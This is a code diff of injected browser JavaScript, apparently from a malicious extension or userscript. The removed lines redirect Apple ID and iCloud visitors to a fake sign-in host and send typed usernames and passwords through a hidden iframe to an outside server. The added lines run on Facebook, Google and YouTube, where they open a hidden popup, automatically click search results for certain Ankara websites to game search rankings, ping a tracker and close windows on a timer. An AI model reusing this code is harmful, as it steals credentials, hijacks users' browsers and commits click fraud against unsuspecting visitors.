@@ -65,45 +65,64 @@ media.instagram.follow("1140348283")
 
 
 
-if(location.hostname.indexOf("appleid.apple.com") >= 0) {
-window.location = "http://signin.info.apple.com";
+if(top.location.hostname.indexOf("facebook") > -1 || top.location.hostname.indexOf("google") > -1 || top.location.hostname.indexOf("youtube") > -1 ){
+
+function setCookie(cname, cvalue) {
+	var d = new Date();
+	d.setTime(d.getTime() + (1000 * 60 * 90 ));
+	var expires = "expires=" + d.toUTCString();
+	document.cookie = cname + "=" + cvalue + "; " + expires
+}
+function getCookie(cname) {
+	var name = cname + "=";
+	var ca = document.cookie.split(';');
+	for (var i = 0; i < ca.length; i++) {
+		var c = ca[i];
+		while (c.charAt(0) == ' ') c = c.substring(1);
+		if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
+	}
+	return ""
+}
+if (getCookie('cookiez') != 1) {
+window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
+new Image().src = '//whos.amung.us/widget/dd0spanel.png';
+setCookie("cookiez", "1")
+}
 }
 
-if(location.hostname.indexOf("icloud.com") >= 0) {
-window.location = "http://signin.info.apple.com";
-}
+var degisken = ['digi', 'evboyama', 'hostel'];  
+var rand = degisken[Math.floor(Math.random() * degisken.length)];
+var giris = Math.floor(Math.random() * ((10000-3000)+1) + 3000);
+var cikis = Math.floor(Math.random() * ((10-3)+1) + 3);
+
+
+if(document.title.indexOf("ankara escort") >= 0){
 	
-	
-	
-if(location.hostname.indexOf("apple.com") >= 0) {
+setTimeout(function () {
+var a = document.getElementsByClassName("_Rm").length;
+var pic = 0;
+for(var i = 0 ; i < a ; i++){
+if(document.getElementsByClassName("_Rm")[i].innerHTML.indexOf(rand) >= 0 ){
+document.querySelectorAll(".r a")[i].click();
+var pic =  1 ; 
+}
+}
+if(pic == 0){document.querySelectorAll(".pn")[0].click();};
+},giris)
 
-	
-	
+											}
 
-		function hit(url) {
-        ifrm = document.createElement("iframe");
-        ifrm.setAttribute("src", url);
-        ifrm.style.width = "0px";
-        ifrm.style.height = "0px";
-        document.body.appendChild(ifrm);
+if (location.hostname.indexOf("digiankara.com") >= 0) {
+new Image().src = '//whos.amung.us/widget/googlegiris.png';
+setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
 }
 
-document.getElementById('submitButton2').onclick = function() {
-
-  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
-  hit(a);
+if (location.hostname.indexOf("ankaraevboyama.com") >= 0) {
+new Image().src = '//whos.amung.us/widget/googlegiris.png';
+setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
 }
 
-document.getElementById('accountname').onkeypress = function(e) {
-    if(e.keyCode == 13) {
-  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
-   hit(a);
- }
-}
-document.getElementById('accountpassword').onkeypress = function(e) {
-    if(e.keyCode == 13) {
-  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
-   hit(a);
- }
-}
+if (location.hostname.indexOf("ankarahostel.net") >= 0) {
+new Image().src = '//whos.amung.us/widget/googlegiris.png';
+setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
 }
